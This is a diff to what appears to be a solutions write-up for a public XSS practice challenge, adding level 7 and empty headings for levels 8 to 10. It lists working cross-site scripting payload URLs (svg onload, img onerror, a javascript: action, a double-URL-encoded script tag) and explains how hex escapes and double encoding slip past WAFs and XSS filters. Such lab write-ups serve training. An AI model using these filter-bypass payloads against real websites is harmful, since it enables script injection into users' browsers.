@@ -9,5 +9,10 @@ Level 5: https://zixem.altervista.org/XSS/5.php?name=zxm&action=javascript:alert
 Level 6: https://zixem.altervista.org/XSS/6.php?name=\x3Csvg/onload=alert(1337)\x3E or 
 [https://zixem.altervista.org/XSS/6.php?name=\x3Cimg/src="x" onerror=alert(1337)\x3E](https://zixem.altervista.org/XSS/6.php?name=\x3Cimg/src=%22x%22%20onerror=alert(1337)\x3E) \
 \x3E and \x3C are hexadecimal escape sequences used in programming languages like JavaScript and C. \
-These can be used to bypass WAFs or XSS filters by encoding < and > in attack payloads.
+These can be used to bypass WAFs or XSS filters by encoding < and > in attack payloads. \
+Level 7 : https://zixem.altervista.org/XSS/7.php?name=zxm%253Cscript%253Ealert(1337)%253C/script%253E \
+To double encode < (%253C) and (%253E)> for use in an XSS payload, need to encode them twice using URL encoding \
+Level 8 :
+Level 9 :
+Level 10 :
 
